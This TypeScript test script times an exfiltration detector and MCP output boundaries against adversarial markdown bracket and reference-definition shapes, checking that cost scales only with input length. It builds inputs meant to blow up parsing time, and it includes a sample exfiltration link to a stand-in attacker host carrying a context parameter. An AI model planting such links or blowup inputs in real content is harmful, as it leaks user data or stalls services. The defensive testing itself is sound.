// T81 — the demonstration T78#F-001 asks for: the label path's cost is a
// function of the INPUT'S OWN LENGTH and of nothing the document can write.
//
// Three questions, because a ladder alone cannot answer the third:
//   A. ladders + growth exponents over every adversarial shape, T78's three and
//      the ones built against each part of this round's repair;
//   B. the INFLATION table — total bytes held CONSTANT while the quantities a
//      payload can choose (the longest definition label, and the number of `[`
//      inside a definition label, which is the one filter threshold a document
//      can raise) are swept across five orders of magnitude. A bound an attacker
//      can inflate shows up here as a rising column; a bound on total work does
//      not;
//   C. the four public boundaries on the worst shape found in A and B.
//
// Synthetic/reserved hosts only. No network, no model call.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";

const OK = "https://ok.example.org/x";
const ATT = "attacker.invalid";
const DEF = (length: number) => `[${"a".repeat(length)}]: ${OK}\n`;
// The one filter a document CAN raise: a definition whose own label carries `[`.
const BRACKET_DEF = (brackets: number) => `[${"[".repeat(brackets)}x]: ${OK}\n`;

function timed(content: string): number {
  // three runs, best of, so a GC pause does not read as a cliff
  let best = Infinity;
  for (let run = 0; run < 3; run += 1) {
    const t0 = performance.now();
    detectExfil(content);
    best = Math.min(best, performance.now() - t0);
  }
  return best;
}

// --- A. ladders -------------------------------------------------------------
type Shape = { name: string; build: (n: number) => string; sizes: number[] };
const LADDER = [12500, 25000, 50000, 100000];
const shapes: Shape[] = [
  // T78's three, unchanged.
  { name: "balancedNest_withLongDef", build: (n) => DEF(200000) + "[".repeat(n) + "]".repeat(n), sizes: LADDER },
  { name: "openRunOneClose_withLongDef", build: (n) => DEF(200000) + "[".repeat(n) + "]", sizes: LADDER },
  { name: "bangOpenRunOneClose_withLongDef", build: (n) => DEF(200000) + "![".repeat(n) + "]", sizes: LADDER },
  // T78's controls, which must not move.
  { name: "balancedNest_noDef", build: (n) => "[".repeat(n) + "]".repeat(n), sizes: [25000, 50000, 100000, 200000, 400000] },
  { name: "openRunOneClose_noDef", build: (n) => "[".repeat(n) + "]", sizes: LADDER },
  // Mine, one per part of the repair.
  { name: "bangBalancedNest_withLongDef", build: (n) => DEF(200000) + "![".repeat(n) + "]".repeat(n), sizes: LADDER },
  { name: "bangOpenRun_bracketKeyDef", build: (n) => BRACKET_DEF(60000) + "![".repeat(n) + "]", sizes: LADDER },
  { name: "bangBalancedNest_bracketKeyDef", build: (n) => BRACKET_DEF(60000) + "![".repeat(n) + "]".repeat(n), sizes: LADDER },
  { name: "wsInflatedBangRun_withLongDef", build: (n) => DEF(200000) + "![ ".repeat(n) + "]", sizes: LADDER },
  { name: "wsInflatedBangRun_tabsAndNewlines", build: (n) => DEF(200000) + "![ \t\n".repeat(n) + "]", sizes: LADDER },
  { name: "bangRunManyCloses_withLongDef", build: (n) => DEF(200000) + "![a]".repeat(n), sizes: LADDER },
  { name: "resolvingBangRun_everyUseHits", build: (n) => DEF(4) + "![aaaa]".repeat(n), sizes: LADDER },
  {
    name: "manyDefsOfDistinctLengths_thenBangRun",
    build: (n) =>
      Array.from({ length: 600 }, (_, i) => DEF(i + 1)).join("") + "![".repeat(n) + "]",
    sizes: LADDER,
  },
  {
    name: "prose_sentenceLabelDef",
    build: (n) =>
      `[${"see the section on ".repeat(Math.ceil((2 * n) / 19)).slice(0, 2 * n)}]: https://docs.example.org/guide\n\n` +
      "[".repeat(n) +
      "]".repeat(n),
    sizes: [4000, 8000, 16000, 32000],
  },
];

const ladders = shapes.map((shape) => {
  const measured = shape.sizes.map((n) => {
    const content = shape.build(n);
    return { n, bytes: content.length, ms: Number(timed(content).toFixed(1)) };
  });
  const last = measured[measured.length - 1];
  const prev = measured[measured.length - 2];
  const exponent =
    prev && last && prev.ms > 0.5
      ? Number((Math.log(last.ms / prev.ms) / Math.log(last.n / prev.n)).toFixed(2))
      : null;
  return { shape: shape.name, measured, exponent };
});

// --- B. inflation: bytes held constant, the attacker's dials swept ----------
//
// Every row below is the SAME total size. If any quantity the document writes
// were still the bound, its column would climb.
const TOTAL = 262144;
function padTo(body: string, total: number): string {
  return body.length >= total ? body.slice(0, total) : body + " ".repeat(total - body.length);
}
const labelLengthSweep = [0, 4, 64, 1000, 20000, 100000].map((length) => {
  const def = length === 0 ? "" : DEF(length);
  const run = Math.floor((TOTAL - def.length) / 4);
  const content = padTo(def + "![".repeat(run) + "]".repeat(run), TOTAL);
  return { defLabelLength: length, bytes: content.length, ms: Number(timed(content).toFixed(1)) };
});
const bracketKeySweep = [0, 1, 10, 1000, 20000, 60000].map((brackets) => {
  const def = BRACKET_DEF(brackets);
  const run = Math.floor((TOTAL - def.length) / 4);
  const content = padTo(def + "![".repeat(run) + "]".repeat(run), TOTAL);
  return { defLabelOpenBrackets: brackets, bytes: content.length, ms: Number(timed(content).toFixed(1)) };
});
const definitionCountSweep = [1, 10, 100, 1000, 5000].map((count) => {
  const def = Array.from({ length: count }, (_, i) => DEF((i % 200) + 1)).join("");
  const run = Math.max(1, Math.floor((TOTAL - def.length) / 4));
  const content = padTo(def + "![".repeat(run) + "]".repeat(run), TOTAL);
  return { definitions: count, bytes: content.length, ms: Number(timed(content).toFixed(1)) };
});

// The budget's failure direction: a document that exhausts the total-work
// budget must FLAG its definitions, never release them.
const exhausting = `[${"[".repeat(60000)}x]: https://${ATT}/p?ctx=CTX\n` + "![".repeat(30000) + "]";
const exhaustingMs = Number(timed(exhausting).toFixed(1));
const exhaustingFindings = detectExfil(exhausting, []);

// --- C. the four public boundaries on the worst shape -----------------------
const worst = ladders
  .flatMap((l) => l.measured.map((m) => ({ shape: l.shape, ...m })))
  .concat(
    labelLengthSweep.map((r) => ({ shape: "labelLengthSweep", n: r.defLabelLength, bytes: r.bytes, ms: r.ms })),
    bracketKeySweep.map((r) => ({ shape: "bracketKeySweep", n: r.defLabelOpenBrackets, bytes: r.bytes, ms: r.ms })),
    definitionCountSweep.map((r) => ({ shape: "definitionCountSweep", n: r.definitions, bytes: r.bytes, ms: r.ms })),
  )
  .sort((a, b) => b.ms - a.ms)[0];

const worstShape = shapes.find((s) => s.name === worst?.shape);
const text = worstShape ? worstShape.build(worst?.n ?? 100000) : exhausting;
const serialized = JSON.stringify({ note: text });
const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};
const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF: the floor
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: [
    {
      name: "p.worst",
      module: "standard" as const,
      description: "worst",
      inputSchema: { type: "object" },
      mutating: false,
      invoke: async () => ({ note: text }),
    },
  ],
};
async function time<T>(label: string, fn: () => T | Promise<T>) {
  const t0 = performance.now();
  await fn();
  return { boundary: label, ms: Number((performance.now() - t0).toFixed(1)) };
}
const boundaries = [
  await time("dispatchCallTool", () => dispatchCallTool(ctx, "p.worst", {})),
  await time("prepareOutputForPersistence", () => prepareOutputForPersistence(pass, serialized)),
  await time("validateOutputForTransport", () =>
    validateOutputForTransport({ value: { note: text }, format: "json" }),
  ),
  await time("redactToolOutput", () => redactToolOutput(cwd, serialized)),
];

console.log(
  JSON.stringify(
    {
      probe: "T81-perf",
      ladders,
      shapesOverOneSecond: ladders
        .filter((l) => l.measured.some((m) => m.ms > 1000))
        .map((l) => l.shape),
      superLinearShapes: ladders
        .filter((l) => typeof l.exponent === "number" && (l.exponent as number) > 1.5)
        .map((l) => ({ shape: l.shape, exponent: l.exponent })),
      inflation: {
        totalBytesHeldConstant: TOTAL,
        labelLengthSweep,
        bracketKeySweep,
        definitionCountSweep,
        labelLengthSpreadMs: Number(
          (Math.max(...labelLengthSweep.map((r) => r.ms)) -
            Math.min(...labelLengthSweep.map((r) => r.ms))).toFixed(1),
        ),
        bracketKeySpreadMs: Number(
          (Math.max(...bracketKeySweep.map((r) => r.ms)) -
            Math.min(...bracketKeySweep.map((r) => r.ms))).toFixed(1),
        ),
      },
      budgetExhaustion: {
        bytes: exhausting.length,
        ms: exhaustingMs,
        findings: exhaustingFindings.length,
        flagsTheDefinition: exhaustingFindings.some((f) => String(f.value).includes(ATT)),
      },
      worst: { shape: worst?.shape, bytes: worst?.bytes, ms: worst?.ms },
      boundaries,
      boundariesOverOneSecond: boundaries.filter((b) => b.ms > 1000).map((b) => b.boundary),
    },
    null,
    2,
  ),
);
